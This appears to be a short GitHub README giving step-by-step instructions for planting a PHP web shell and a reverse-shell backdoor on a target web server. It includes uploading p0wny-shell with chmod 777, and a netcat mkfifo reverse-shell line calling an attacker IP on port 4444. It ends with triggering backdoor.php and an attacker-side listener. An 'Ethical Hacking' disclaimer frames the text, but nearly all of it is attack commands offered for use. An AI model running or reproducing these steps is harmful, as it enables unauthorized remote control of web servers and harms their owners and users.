## Information

I am not responsible for any consequences caused by this script because this script was created for `Ethical Hacking` purposes.


## Methode 1

Upload PHPShell (Target Folder, Example : /var/www/html)
```
https://github.com/flozz/p0wny-shell.git
```
```
chmod -R 777 *
```

Access Web Server with Browser
```
http://targetwebsite.com/shell.php 
```

## Methode 2

## Target Side

Download Payload (Target Folder, Example : /var/www/html)
```
git clone https://github.com/anggrdwjy/php-reverse-shell.git
```
```
cd php-reverse-shell
```
```
chmod -R 777 *
```

Edit File : payload_nc.c
```
system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.100.1 4444 >/tmp/f");  //Edit Line 5
```

Running File : gcc.sh
```
./gcc.sh
```

Access Web Server with Browser
```
http://targetwebsite.com/backdoor.php 
```

## Attacker Side
```
nc -tnlp 4444 
```

## Support

* [:octocat: Follow me on GitHub](https://github.com/anggrdwjy)
* [🔔 Subscribe me on Youtube](https://www.youtube.com/@anggarda.wijaya)

## References

* https://github.com/kurniawandata
* https://github.com/flozz/p0wny-shell
